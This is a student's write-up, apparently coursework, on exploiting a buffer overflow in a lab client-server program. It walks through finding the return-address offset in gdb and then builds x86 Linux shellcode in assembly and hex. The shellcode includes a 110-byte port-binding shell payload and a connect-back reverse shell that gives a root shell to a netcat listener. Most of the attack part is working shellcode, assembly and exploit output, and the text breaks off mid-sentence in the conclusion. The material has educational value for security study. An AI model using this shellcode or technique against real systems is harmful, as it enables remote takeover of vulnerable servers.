# Author: Victor BUSA

**Note** : I'm French, so please be indulgent, or try to speak and write French ;)
I made this paper to explain how I worked out to write the payload


## --[ Index
1. Identify the flaw
2. ways to attack the server
    2.1 - Port Binding Shellcode
    2.2 - Socket Descriptor Reuse Shellcode
    2.3 - Connect Back Shellcode

3. Write the shellcode
    3.1 - Use Port Binding Shellcode
	3.2 - Use Socket Descriptor Reuse Shellcode
	3.3 - Use Connect Back Shellcode
		
4. Writing the exploit
	
5. Conclusion


## --[ 1 - Identify the flaw
We wanna exploit a flaw in the server. So we launch the server and the client
and we try to enter a large amount of characters to see if there is a 
Segmentation Fault. Once we launch the server and the client we saw something
like that :

```sh
	[student@localhost Documents]$ ./client							
	Please select an option:										
	1. Time															
	2. Date															
	1																
	The time is 01:52 PM											
	Do you wish to continue? (Y/N)									
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA		
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA		
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA		
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA		
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA							
																		
																		
	[student@localhost Documents]$ ./server						
	Segmentation fault												
```

So to resume we entered 1 in the first time and then when the program asked 
you to continue we flood with a large amount of A. We can then see that 
the server Seg Fault. So there is a flaw let's identify it. As the flaw occurs
when we reply to the question : "Do you wish to continue? (Y/N)" we gonna 
analyse the code near this text...

```C
	/* Append question */											
	strncat(buffer, "Do you wish to continue? (Y/N)\n",			
	BLENGTH); //define BLENGTH 256								
																			
	/* Send to client */											
	send(s, (void *)buffer, BLENGTH, 0);							
																			
	/* Receive reply */											
	recv(s, (void *)buffer, BLENGTH, 0);							
																			
	/* Make copy */												
	strcpy(response, buffer);										
																			
```

So if we entered "Y". our response will be send to the socket and the socket
will handle it this way : 

```C
	if (strcmp(answer, "Y\n")) { //if answer != Y					
		break;													
	}															
```
	
so we entered AAAAAAAAAAAAAAA... which is different from Y. So normally we 
should exit the program. And obviously we exit the program but the server Seg
Fault too. Why the server Seg Fault ? Se send "AAAAAAAAAAAAAAAAAAA...."then as
"AAAAAAAAAAAAA..." != Y we break and we receive the fact that we are about to
exit the program thru

```C
	/* Receive reply */											
	recv(s, (void *)buffer, BLENGTH, 0);							
																			
	//after that the function copy the buffer in the response thru	
																			
	/* Make copy */												
	strcpy(response, buffer);										
```


Or the buffer (what we entered is 256 char long). To see that just take a look
at the function handle_it(int s); or the response is 128 char long cause in 
handle_it :

```C
	char answer[ALENGTH]; //define ALENGTH 128						
	char buffer[BLENGTH]; //define BLENGTH 256						

			.														
			.														
			.														

	execute_command(s, x, buffer, answer);	//response = answer						
```

So if we passed more than 128 char, we can rewrite some others space in memory
and the server SEG FAULT. This is because strcpy is an unsafe function. So
let's see how many char we can entered before rewriting the return address...
We gonna send for example "A"x128 + 0123456789azertyuiopqsdfghjklmwxcvbn 

```sh
    THE SERVER

	[student@localhost Documents]$ gdb -q server
	Reading symbols from /home/student/Documents/server...
	(no debugging symbols found)...done.
	(gdb) run
	Starting program: /home/student/Documents/server 
	[Thread debugging using libthread_db enabled]
	[New Thread 0xb7ff0b70 (LWP 9382)]
	[Thread 0xb7ff0b70 (LWP 9382) exited]
	[New Thread 0xb7ff0b70 (LWP 9387)]

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to Thread 0xb7ff0b70 (LWP 9387)]
	0x7a613938 in ?? ()
	Missing separate debuginfos, use: debuginfo-install 
	glibc-2.12-1.149.el6.i686
	(gdb) 
```

```sh
		THE CLIENT

	[student@localhost Documents]$ ./client
	Please select an option:
	1. Time
	2. Date
	1
	The time is 02:17 PM
	Do you wish to continue? (Y/N)
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0123456789
	azertyuiopqsdfghjklmwxcvbn
```

So what is interesting is this part [server] :

```sh
	Program received signal SIGSEGV, Segmentation fault.
	[Switching to Thread 0xb7ff0b70 (LWP 9387)]
	0x7a613938 in ?? ()
```

this part tell us that the server Seg Fault and that the return address is now
0x7a613938 Or a table HEX to ASCII tells us that 0x7a613938 = za98 so in Big 
Endian : 89az. Thus we can entered : "A"x128 + 0123456789az = 140 char before
rewriting the return addr.


## --[ 2 - Ways to attack the server

The difference with the local exploit is that in this case we should use the
socket. To do that as we don't have a direct access to the remote machine,
we should create a shellcode that bind a shell on your port (here  : 8001).
We can do it in many differents way :

### --[ 2.1 - Port Binding Shellcode
This is the most primitive technique. We just recreate a shellcode that
create a server on the exploited host that executes a shell when connected
to. Drawbacks : we have to create the socket (so the shellcode can be quite
long) and a firewall can be in place with a default deny policy and can cause
our shellcode to terminate.
	
### --[ 2.2 - Socket Descriptor Reuse Shellcode
This is a better tactic. Here we recycle the current socket descriptor and
utilize that socket instead of creating a new one. Drawbacks : we have to
identify the socket descriptor. Advantage : shellcode shorter, the firewall
won't keep us from doing that cause we reuse a already existing socket.
	
### --[ 2.3 - Connect Back Shellcode
The same principle of Port Binding Shellcode but this time we use an out
connection. Thus, the firewall won't detect it easily because nowadays
every computer are connected to the web. If we use a in connection. The
firewall may warm us someone try to enter in our computer... ^^	


## --[ 3 - Write the shellcode

## --[ 3.1 - Use Port Binding Shellcode
We gonna choose the first option in this part. So we have to create a whole
socket. As we have only 140 - 4 (rewriting the ret addr), we have to create
a shellcode as short as possible. let's do it...
	
Remember :
1. We should bind our shell on port 8001
2. Our shellcode doesn't contain null byte
3. the shellcode should be as short as possible


to create our shellcode we have 2 options, either :
	
+ create the program in C and disassemble it (but it can be not as short as
	possible and can contain null byte)
	
+ write our shellcode in asm directly but that suppose we are a real badass
	with a great beard !

So what we gonna do is a mix of those 2 options ;).	So firstly we have to
know the syscalls we gonna use to bind the shell. Here we gonna use
`SYS_socketcall`. It gonna handle everything related to the connection.

To have all the necessary information, we gonna take a look at `/usr/include/asm/unistd.h`. Here we see : 

```C
	#define __NR_exit		  1 //0x01
	#define __NR_execve		 11 //0x0b
	#define __NR_dup2		 63	//0x3f
	#define __NR_socketcall		102	//0x66
```

so that means, for instance, that we should put `0x3f` in `%eax` before doing `int 0x80` and we also open `/usr/include/linux/net.h` and we see :

```C
	#define SYS_SOCKET	1		/* sys_socket(2)		*/
	#define SYS_BIND	2		/* sys_bind(2)			*/
	#define SYS_CONNECT	3		/* sys_connect(2)		*/
	#define SYS_LISTEN	4		/* sys_listen(2)		*/
	#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

that means that to call socket() for example we should put `0x01` in `%ebx`. Why `%ebx` ? We can see that when we disassemble the socket function. We'll see that soon. So now let's go... We gonna create our shellcode in **C** and  then disassemble it thru **gdb**. To do so, don't forget to compile with `-static` in order to have the right to disass the different `libc` function. here is the program in **C** to connect to the socket thru port 8001 and we use `dup2` to duplicate stdin, stdout and stderr to the socket with a loop and then we execute a shell.
	
		;================================================================;
		;	REMINDER : under Linux architecture to do syscall            ;
		;	%eax is always 0x66, %ebx contains the kind of call          ;
		;	and %ecx points on the args of the call		                 ;
		;================================================================;


```C
	#include <stdlib.h>
	#include <stdio.h>
	#include <unistd.h>
	#include <string.h>
	#include <sys/socket.h>
	#include <netinet/in.h>
	#include <arpa/inet.h>

	#define PORT 8001

	void binsh(void) {
		int sockfd, new_sockfd; // Listen on sockfd, new connection on newfd
		struct sockaddr_in host_addr; //, client_addr; // My addr info
		
		sockfd = socket(PF_INET, SOCK_STREAM, 0);
		
		host_addr.sin_family = AF_INET; // IPv4
		host_addr.sin_port = htons(PORT); //Short, network byte order
		host_addr.sin_addr.s_addr = 0; // Automatically fill with my IP
		//memset( &(host_addr.sin_zero), '\0', 8); // Zero the rest of the struct
		
		bind(sockfd, (struct sockaddr *) &host_addr, sizeof(struct sockaddr));
		
		listen(sockfd, 5);
		new_sockfd = accept(sockfd, NULL, NULL);

		dup2(new_sockfd, 0);
		dup2(new_sockfd, 1);
		dup2(new_sockfd, 2);

		execve("/bin/sh", NULL, NULL);
	}

	int main(void) {
		binsh();
		return 0;
	}
```

So, now we have the code let's compile it and try it with telnet :

```sh
	[student@localhost Documents]$ ./payload &
	[2] 16991
	[student@localhost Documents]$ telnet 127.0.0.1 8001
	Trying 127.0.0.1...
	Connected to 127.0.0.1.
	Escape character is '^]'.
	echo that works !!
	that works !!
	^[)
```

Ok our program works. So now we can disassemble it and try to write our shellcode in asm. I will show you how	to do for the first syscall (socket) and then I will do it again for the others syscall... Let's go :

```sh
	[student@localhost Documents]$ gdb payload -q
	Reading symbols from /home/student/Documents/payload...done.
	(gdb) disas binsh 
	Dump of assembler code for function binsh:
	   [...]

	   0x080482c2 <+6>:	movl   $0x0,0x8(%esp)
	   // push IPPROTO_IP = 0
	   0x080482ca <+14>:	movl   $0x1,0x4(%esp)
	   // push SOCK_STREAM = 1
	   0x080482d2 <+22>:	movl   $0x2,(%esp)
	   // push AF_INET = 2
	   0x080482d9 <+29>:	call   0x8055480 <socket>

	   [...]
	   0x0804839e <+226>:	leave  
	   0x0804839f <+227>:	ret    
	End of assembler dump.
	(gdb) disas socket
	Dump of assembler code for function socket:
	   0x08055480 <+0>:	mov    %ebx,%edx
	   0x08055482 <+2>:	mov    $0x66,%eax
	   0x08055487 <+7>:	mov    $0x1,%ebx
	   0x0805548c <+12>:	lea    0x4(%esp),%ecx
	   0x08055490 <+16>:	call   *0x80d6904
	   0x08055496 <+22>:	mov    %edx,%ebx
	   0x08055498 <+24>:	cmp    $0xffffff83,%eax
	   0x0805549b <+27>:	jae    0x8056830 <__syscall_error>
	   0x080554a1 <+33>:	ret    
	End of assembler dump.
	(gdb)
```

Ok, so here I disassemble the binsh function and I've just let the interesting code. I also disassemble the socket function.

at **<socket+2>** we can see : `mov    $0x66,%eax`. that corresponds to the `syscall socket` (0x66 = 102d).
Go to part II/: if you've already forgotten about this. 
Then at **<socket+7>** we can see : `mov    $0x1,%ebx`.
And we saw in part II that 0x1 in %ebx corresponds to socket().
	

So we can end with :

```assembly
	#socket(AF_INET, SOCK_STREAM, 0);
	xor %ebx, %ebx      # clear ebx
	mul %ebx      # clear eax
	inc %bl       # %ebx = 1 = socket() (bl = lsb of ebx)
	movb $0x66, %al     # socketcall() in %eax, al = lsb of %eax
	cdq       # bits of %edx are equal of the mst of %eax
			# i.e here equivalent at mov $0x0, %edx
	push %edx     # IPPROTO_IP
	push $0x1       # SOCK_STREAM
	push $0x2       # AF_INET
	mov %esp, %ecx      # move pointer to args to ecx
	int $0x80       # call socket()
	mov %eax, %edi      # save socketfd to use it later
```

I commented each lines. This is actually the most complicated part of this "paper". There is several possibility to write it in asm. This is one. Probably not the best one but I tried to reduce the size of the code... So after several hours of works I end up with :

```assembly
	#bind(sockfd, (struct sockaddr *) &host_addr, sizeof(struct sockaddr));
	#bind(sockfd, {2, 8001, 0}, 16);
	xor %eax, %eax
	movb $0x66, %al     # socketcall() in %eax
	inc %ebx      # %ebx = 1 so inc bl -> %ebx = 2 = bind()
	push %edx     # Construct sockaddr : INADDR_ANY = 0 (%edx = 0)
	pushw $0x411f       # PORT = 8001 (reverse cause 8001d = 0x1f41)
	push %bx      # AF_INET = 2
	mov %esp, %ecx      # %ecx point on the struct sockaddr.
	push $16      # sizeof(struct sockaddr)
	push %ecx       # (struct sockaddr *) &host_addr
	push %edi       # sockfd
	mov %esp, %ecx      # pointer to args
	int $0x80       # call bind();

	#listen(sockfd, 5);
	xor %eax, %eax
	movb $0x66, %al     # socketcall() in %eax
	add %ebx, %ebx      # %ebx = 4 = listen()
	push $0x5       # queue = 5
	push %edi       # %edi is the sockfd
	mov %esp, %ecx      # pointer to args
	int $0x80       # call listen();


	#new_sockfd = accept(sockfd, NULL, NULL);
	push $0x66
	pop %eax      # socketcall() in %eax
	inc %ebx      # %ebx = 5 = accept()
	push %edx       # 0
	push %edx       # NULL
	push %edi       # sockfd
	mov %esp, %ecx      # pointer to args
	int $0x80       # call accept()
```

So now we gonna call 3 times `dup2` so we can maybe use a loop to decrease the number of instructions :-D. and furthermore when we disassemble `dup2` in **gdb** we can see that `dup2` use `%ecx` and `%edx` before `int 0x80` (to see the int 0x80 instruction we have to disas the call : `disas *0x80d6904`). So to resume we'll need:
	
+ `%eax` for the sys_call
+ `%ecx` for the stdin, stdout, stderr
+ `%edx` for the socket
+ `%ebx` is free to use for the loop but as %ecx = 2, 1, 0

we can use `%ecx` and use a `jns` (jump till %ecx > 0)
	
```sh
	(gdb) disas dup2
	Dump of assembler code for function dup2:
	   0x08053fb0 <+0>:	mov    %ebx,%edx
	   0x08053fb2 <+2>:	mov    0x8(%esp),%ecx
	   0x08053fb6 <+6>:	mov    0x4(%esp),%ebx
	   0x08053fba <+10>:	mov    $0x3f,%eax
	   0x08053fbf <+15>:	call   *0x80d6904
```
```
	;dup2(socket, i) where i = 0, 1 then 2;
	mov %eax, %ebx      # %ebx is new_sockfd now
	xor %eax, %eax      # why do I need this ?
	xor %ecx, %ecx
	mov $0x2, %cl     # count and %ecx = 2, 1, 0
	dup2:
	  movb $0x3f, %al   # dup2()
	  int $0x80     # call dup2()
	  dec %ecx    # decr %ecx
	  jns dup2
```
then we take the `execve()` see in class:

```assembly
	#execve("/bin/sh", NULL, NULL);
	jmp jtoc
	jtop:
	popl  %esi
	xorl  %eax,%eax   # Zero %eax
	#movb %al,0x7(%esi)   # NULL terminate /bin/sh
	push  %eax      # NULL after pointer below
	push  %esi      # Create pointer to array
	xorl  %edx, %edx    # NULL in %edx
	movl  %esp,%ecx   # Address of array in %ecx
	movl  %esi,%ebx   # Address of /bin/sh in %ebx
	movb  $0xb,%al    # Set up for execve call in %eax
	int $0x80 

	jtoc:
	  call  jtop
	  .string "/bin/sh"
```

and we finally generate the payload :

	0x31	0xdb	0xf7	0xe3	0xfe	0xc3	0xb0	0x66
	0x99	0x52	0x6a	0x01	0x6a	0x02	0x89	0xe1
	0xcd	0x80	0x89	0xc7	0xb8	0x66	0x00	0x00
	0x00	0x43	0x52	0x68	0x1f	0x41	0x00	0x00
	0x66	0x53	0x89	0xe1	0x6a	0x10	0x51	0x57
	0x89	0xe1	0xcd	0x80	0xb8	0x66	0x00	0x00
	0x00	0x01	0xdb	0x6a	0x05	0x57	0x89	0xe1
	0xcd	0x80	0xb8	0x66	0x00	0x00	0x00	0x43
	0x52	0x52	0x57	0x89	0xe1	0xcd	0x80	0x89
	0xc3	0x31	0xc0	0xb9	0x02	0x00	0x00	0x00
	0xb8	0x3f	0x00	0x00	0x00	0xcd	0x80	0x49
	0x79	0xf6	0xeb	0x0f	0x5e	0x31	0xc0  	0x50
	0x56	0x31	0xd2	0x89	0xe1	0x89	0xf3	0xb0
	0x0b	0xcd	0x80	0xe8	0xec	0xff	0xff	0xff
	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68

problem : there are null bytes so we have to change some instructions : for example `mov $0x3f, %eax` in `movb $0x3f, $al`.	At the end we ended with this **110 bytes shellcode** :

	0x31  0xdb  0xf7  0xe3  0xfe  0xc3  0xb0  0x66
	0x99  0x52  0x6a  0x01  0x6a  0x02  0x89  0xe1
	0xcd  0x80  0x89  0xc7  0x31  0xc0  0xb0  0x66
	0x43  0x52  0x66  0x68  0x1f  0x41  0x66  0x53
	0x89  0xe1  0x6a  0x10  0x51  0x57  0x89  0xe1
	0xcd  0x80  0x31  0xc0  0xb0  0x66  0x01  0xdb
	0x6a  0x05  0x57  0x89  0xe1  0xcd  0x80  0x6a
	0x66  0x58  0x43  0x52  0x52  0x57  0x89  0xe1
	0xcd  0x80  0x89  0xc3  0x31  0xc0  0x31  0xc9
	0xb1  0x02  0xb0  0x3f  0xcd  0x80  0x49  0x79
	0xf9  0xeb  0x0f  0x5e  0x31  0xc0  0x50  0x56
	0x31  0xd2  0x89  0xe1  0x89  0xf3  0xb0  0x0b
	0xcd  0x80  0xe8  0xec  0xff  0xff  0xff  0x2f
	0x62  0x69  0x6e  0x2f  0x73  0x68

**Note 1** : the final payload is at the end of the paper.
	
### --[ 3.2 - Use Socket Descriptor Reuse Shellcode
I won't all explain in this part because I already explained lots of thing in the prev' part. Here the idea is to use the already existing socket. So before to creating of our shellcode I will just motify the `server.c` to simulate the attack. to do so I will just add this piece of code in server.c after "strcpy(response, buffer);"
	
```C
	char	*cmd[] = {"/bin/sh", NULL, NULL};
	if (fork() == 0) // we are in the child
   {
		dup2(s, 0);		//s is the socket descriptor
		dup2(s, 1);
		dup2(s, 2);
		//setresuid(0,0,0);
		execve(cmd[0], cmd, NULL);
    }
```

So the code is easily understandable. But when we try to execute it we don't have the shellcode **sh-4.1#** that appears on the client side. Instead with only have a black cursor and when we entered commands nothing happen. Then when we kill the server all the commands are executed in the client side...
	
so now we gonna reduce the code we've just added to `server.c`. Now, it looks like :
	
```C
	char	*cmd[] = {"/bin/sh", NULL, NULL};
	execve(cmd[0], cmd, NULL);
```

So obviously, this code is supposed to launch a shell on the server side. Let's try to see if it works !
	
```sh
	[student@localhost exam]$ ./xstack server2
	[student@localhost exam]$ gdb -q server2
	Reading symbols from /home/student/Documents/exam/server2...done.
	(gdb) r
	Starting program: /home/student/Documents/exam/server2 
	[Thread debugging using libthread_db enabled]
	[New Thread 0x16e7b70 (LWP 10141)]
	[Thread 0x16e7b70 (LWP 10141) exited]
	process 10134 is executing new program: /bin/bash
	Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.149.el6.i686
```

So we can see that is the case : `process 10134 is executing new program: /bin/bash`
Now we cannot see **sh-4.1$**. To see it we have to fork the process and to execute
the shell in the child... If we fork the process we can know see : 
	
```sh
	[student@localhost exam]$ ./xstack server2
	[student@localhost exam]$ gdb -q server2
	Reading symbols from /home/student/Documents/exam/server2...done.
	(gdb) r
	Starting program: /home/student/Documents/exam/server2 
	[Thread debugging using libthread_db enabled]
	[New Thread 0x16e7b70 (LWP 10354)]
	Detaching after fork from child process 10355.
	[Thread 0x16e7b70 (LWP 10354) exited]
	sh-4.1$ 
```
	
Ok so now, we can have a shell in the server side. So to have the shell in the client side we just have to redirect stdout, stdin (stderr) on the socket. We can do that with `dup2` as seeing in part **3.1**. So we do that and we execute. We look this time what happens on the client side... 

_Note_ : this is exactly the code I show you in the beginning of this part:
	
```sh
    SERVER SIDE

	[student@localhost exam]$ ./xstack server2
	[student@localhost exam]$ gdb -q server2
	Reading symbols from /home/student/Documents/exam/server2...done.
	(gdb) r
	Starting program: /home/student/Documents/exam/server2 
	[Thread debugging using libthread_db enabled]
	[New Thread 0x16e7b70 (LWP 10618)]
	Detaching after fork from child process 10619.
	[Thread 0x16e7b70 (LWP 10618) exited]
```
	
```sh
	CLIENT SIDE

	[student@localhost exam]$ ./client
	Please select an option:
	1. Time
	2. Date
	1
	The time is 04:23 PM
	Do you wish to continue? (Y/N)
	
```
	
So wee see now that nothing appears on the client side... Where is our **sh-4.1$** ? To say the truth, I have no idea :'(. But if we enter commands on the client side like `ls`, `whoami`, and so on... and then if we kill the server, all the commands are executed on the server side. It seems that all the commands are saved in a buffer or something... What is the problem ? the `dup2` ? Ok we gonna try something else... we replace :

```C
	char	*cmd[] = {"/bin/sh", NULL, NULL};
```
	
by
```C
	char	*cmd[] = {"/bin/ls", "-l", NULL};
```
	
Now we execute the code again to see if something happen on the client side and we can see that something happens... :-D. **BUT** we cannot see all the files. there is still something wrong.
	
```sh
	[student@localhost exam]$ ./client
	Please select an option:
	1. Time
	2. Date
	1
	The time is 04:42 PM
	Do you wish to continue? (Y/N)

	total 804
	drwxr--r--. 2 root    root      4096 Dec  6 20:01 A
	-rw-rw-r--. 1 student student    420 Nov 18 21:06 bindsh.s
	-rwxrwxr-x. 1 student student  10202 Dec  7 16:42 client
	-rw-rw-r--. 1 student student   4245 Dec  7 16:00 client.c
	-rw-rw-r--. 1 stude��
	nt student   4245 Dec  7 16:00 client.c~
	-rwxrwxr-x. 1 student student   4700 Dec  6 12:09 lol
	-rw-rw-r--. 1 student student    836 Dec  6 12:15 lol.s
	-rw-rw-r--. 1 student student    877 Dec  6 12:09 lol.s~
	-rwxrwxr-x. 1 student student   4742 Nov 20 16:2��
	[student@localhost exam]$ 
```

Ok so there is something weird that happens and that I cannot explain... But we gonna try to write a shellcode that will do the same thing. That is to say we gonna write a shellcode that gonna launch `/bin/ls` on the client side. And if that works then theoretically if we replace `/bin/ls` by `/bin/sh` we should have something that works (but as we see before it should only work theoretically). So let's write this shellcode (I skipped the steps because I did an example in the first part).
	
but before let's talk about weird thing :
if I write : `char	*cmd[] = {"/bin/ls", NULL, NULL};`
without `dup2`, so that the output will be on the server side. That works !
**BUT**, if now I use `dup2` so that the output will be on the client side it doesn't work
So... It's pretty weird because that could work with `*cmd[] = {"/bin/ls", "-l", NULL};`
We just replaced "-l" by "NULL" and it doesn't work anymore on client side :'(...
	
I don't know how to solve those problems :'(. But let's try to write a shellcode that will launch `*cmd[] = {"/bin/ls", "-l", NULL};` on the server side...
	
```assembly
		.globl main
		.type	main, @function

	main:
	push $0x02			# syscall for fork
	pop %eax			# value in %eax (push/pop better than mov)
	int $0x80			# call fork --> cause %eax = 0


	push $0x08			# value of socket = 8
	pop %ebx			# put the value of the socket in %ebx

	#dup2(socket, i) where i = 0, 1 then 2;
	xor %edx, %edx			# %edx to 0
	xor %eax, %eax			# %eax to 0
	xor %ecx, %ecx
	mov $0x2, %cl			# count and %ecx = 2, 1, 0
	dup2:
		movb $0x3f, %al	 	# dup2()
		int $0x80 		# call dup2()
		dec %ecx 		# decr %ecx
		jns dup2


	#execve("/bin/ls", ["/bin//ls", "-l"], NULL);
	mov $11, %al			# execve
	push %edx			# Null at the end of the string
	push $0x736c2f2f		# "//ls" $0x68732f2f
	push $0x6e69622f		# "/bin"
	mov %esp, %ebx			# address of "/bin//sh\0" in %ebx

	push %edx			# push NULL
	push $0x20206c2d		# push "-l  "
	mov %esp, %esi			# address of "-l  "

	push %edx
	push %edx			# push NULL
	push %esi			# push addess of "-l  "
	push %ebx			# push address of "/bin//sh\0"
	mov %esp, %ecx			# argv (2)
	int $0x80
```
	
here is the shellcode... Unfortunately it doesn't work as expected... We didn't see the file of the current folder in the client side. Instead we can see that on the **server side**:
	
```sh
	(gdb) r
	Starting program: /home/student/Documents/exam/server 
	[Thread debugging using libthread_db enabled]
	[New Thread 0x16e7b70 (LWP 21523)]
	[Thread 0x16e7b70 (LWP 21523) exited]
	process 21514 is executing new program: /bin/bash
	Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.149.el6.i686
	Detaching after fork from child process 21532
```
	
So... I'm done with this... Nothing work as expected and I don't know why... I tried several things but nothing WORKS. the **sh-4.1$** freeze in client side and I can't execute any command. There is obviously a problem with the fact that we try to connect on the same port 8001 or something. So let's try the last way to attack the server.
	
### --[ 3.2 - Use Connect Back Shellcode
	
Ok nothing works until now, and I spend lots of time to find a solution to the problem. Why it doesn't work ? What is wrong. But I don't understand what's going on the computer. So when a solution doesn't work and we don't know why we keep continue by finding another	way to do it. So now let's create a **Connect Back Shellcode on port 12345** for example.
	
The principle :
The server is running on the remote computer. I create a socket that listen on port 12345
on my computer.	I launch the exploit on my computer. My exploit launch a connection on the
port 12345 (so connect to the socket I create) and execute a shell.
	
So as I already explain how to create a shellcode in the part **3.1** I won't explain it
again but the principle remains the same. This time we create a socket with `socket()`,
then we connect to the socket with `connect()`. the asm code for `connect()` looks almost
the same as the one for `bind()` but this time `%ebx = 3 = connect()` and beside the port
we have to put _ip address_ on which we will to connect. I connect on _127.0.0.1_. In
assembly it's _0x0100007f_. Yet there are **NULL bytes** so I use a "not technique". I write
0xfeffff80 (which is 128.255.255.254) and I **not** this value before pushing it into the
stack. So let's see the payload:
	
```assembly
		.globl main
		.type	main, @function

	main:
	#socket(AF_INET, SOCK_STREAM, 0);
	xor %ebx, %ebx			# clear ebx
	mul %ebx			# clear eax
	inc %bl				# %ebx = 1 = socket() (bl = lsb of ebx)
	movb $0x66, %al 		# socketcall() in %eax, al = lsb of %eax
	cdq				# bits of %edx are equal of the mst of %eax
					# i.e here equivalent at mov $0x0, %edx
	push %edx			# IPPROTO_IP
	push $0x1 			# SOCK_STREAM
	push $0x2 			# AF_INET
	mov %esp, %ecx			# move pointer to args to ecx
	int $0x80 			# call socket(), %eax contain the socket descriptor
	xchg %eax, %esi 		# save the descriptor in %esi for later use

	#connect(s, [AF_INET, 12345, 127.0.0.1], 16);
	push $0x66			# push/pop cost less then mov $0x66, %eax
	pop %eax			# socketcall() in %eax
	inc %ebx 			# %ebx = 1 so inc %ebx -> %ebx = 2 = bind()
	mov $0xfeffff80, %edi		# (0xfeffff80 = 128.255.255.254)
	not %edi			# %edi is now 127.0.0.1
	push %edi			# push ip = 127.0.0.1
	pushw $0x3930 			# PORT = 12345 (reverse cause 12345d = 0x3039)
	push %bx 			# AF_INET = 2
	mov %esp, %ecx			# %ecx point on the struct sockaddr.
	push $16 			# sizeof(struct sockaddr)
	push %ecx 			# (struct sockaddr *) &host_addr
	push %esi 			# sockfd
	mov %esp, %ecx			# pointer to args
	inc %ebx			# %ebx = 3 = SYS_CONNECT = connect()
	int $0x80 			# call connect();

	#dup2(socket, i) where i = 0, 1 then 2;
	xchg %ebx, %esi			# socket descriptor in %esi, 3 in %eax
	push $0x2			# push/pop cost less than mov in %ecx
	pop %ecx			# %ecx = counter from 2 to 0
	dup2:
		movb $0x3f, %al	 	# dup2()
		int $0x80 		# call dup2()
		dec %ecx 		# decr %ecx
		jns dup2

	#execve("/bin/sh", ["/bin//sh", NULL], NULL);
	mov $11, %al			#execve
	push %edx			#Null at the end of the string
	push $0x68732f2f		# "//sh"
	push $0x6e69622f		# "/bin"
	mov %esp, %ebx			# address of "/bin//sh\0" in %ebx
	push %edx			# push NULL
	mov %esp, %edx			# tab empty (3)
	push %ebx			# push addess of "/bin//sh"
	mov %esp, %ecx			# argv (2)
	int $0x80
```
	
I commented the code., so everyone can understand it. Ok so now we can try this :
	
```sh
    NETCAT LISTENING SOCKET
	
	[student@localhost exam]$ nc -v -l 127.0.0.1 12345
	Connection from 127.0.0.1 port 12345 [tcp/italk] accepted
	whoami
	root
	ps
	  PID TTY          TIME CMD
	 6496 pts/1    00:00:00 su
	 6505 pts/1    00:00:00 bash
	11113 pts/1    00:00:00 sh
	11118 pts/1    00:00:00 ps
```
```sh
	VULNERABLE SERVER 

	[root@localhost exam]# ./xstack server
	[root@localhost exam]# ./server &
	[1] 11113
```
```sh
	EXPLOIT ON CLIENT SIDE
	
	[root@localhost exam]# ./exploit
	Please select an option:
	1. Time
	2. Date
	1
	The time is 09:52 AM
	Do you wish to continue? (Y/N)
```
	
So we can see on our netcat listening socket that when we type `whoami` the answer is:
_root_ and not _student_ and yet we launch netcat with _student privilege_. That means that
we have executed a remote shell because we executed the server with root user...
So it's done :-D.
	
## --[ 4 - Writing the exploit

Ok so now that we are our payload (110 bytes). We gonna use it. as we only have
140 bytes to attack the server we have to operate this way:

	 ____________________________________________________________
	| 26 NOPs |      payload (110 bytes     | ret addr (4 bytes) |
	|_________|_____________________________|____________________|

So what we need is to find the address the buffer we exploit. To do this we
gonna use gdb. So let's go :

```sh
    CLIENT SIDE
	
	[student@localhost Documents]$ ./client
	Please select an option:
	1. Time
	2. Date
	1
	The time is 02:12 PM
	Do you wish to continue? (Y/N)
	01234567890123456789012345678901234567890123456789
	01234567890123456789012345678901234567890123456789
	01234567890123456789012345678901234567890123456789
	01234567890123456789012345678901234567890123456789
	01234567890123456789012345678901234567890123456789
	01234567890123456789012345678901234567890123456789
	01234567890123456789
```
```sh
	server :
	[student@localhost Documents]$ ./xstack server
	[student@localhost Documents]$ gdb ./server -q
	Reading symbols from /home/... done
	(gdb) run
	Starting program: /home/student/Documents/server 
	[Thread debugging using libthread_db enabled]
	[New Thread 0x16e7b70 (LWP 10286)]

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to Thread 0x16e7b70 (LWP 10286)]
	0x39383736 in ?? ()
	Missing separate debuginfos, use: debuginfo-
	install glibc-2.12-1.149.el6.i686
	(gdb) x/200xb $esp-250
	0x16e7286:  0xb1  0x00  0xf4  0xf6  0xcc  0x00  0x2b  0x85
								  .
								  .
								  .
	0x16e72e6:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
	0x16e72ee:  0x00  0x00  0x4c  0x19  0x11  0x00  0x30  0x31
	0x16e72f6:  0x32  0x33  0x34  0x35  0x36  0x37  0x38  0x39
	0x16e72fe:  0x30  0x31  0x32  0x33  0x34  0x35  0x36  0x37
```

So we see `0x30 0x31` and so on... this is our `0123...` So let's take `0x16e72f8` for example
 :-) (There will be NOPs...).
 
 **WARNING**: Actually... And I don't know why again... But our payload is rewrited on execution time if we do like this (after 88 bytes our payload is rewrited). Maybe because we also rewrite %ebp... I don't have a clue but I try a different 
 way that works better:
 
	 _______________________________________________
	| payload      |      NOPs	    |  new ret addr | 
	|______________|________________|_______________|


**Note**: Actually we can attack 2 different buffers: The buffer from which we copy from
called buffer (0x016e70f4 in my case) and the buffer which is the copy called response
(0x016e72f4 in my case). So we gonna use here the address 0x16e72f4 and not
the address : 0x16e70f4. To see the exploit just take a look a `exploit.c`. Actually it's
the `client.c` but slightly change so that I send my payload to the server.


## --[ 5 - Conclusion
There is lots of weird things that happen when we try to exploit the program. Actually
theoretically we can exploit it just by doing our way, but it seems like `dup2` doesn't
wanna work. Also I don't know why our payload is rewriting on execution time from the
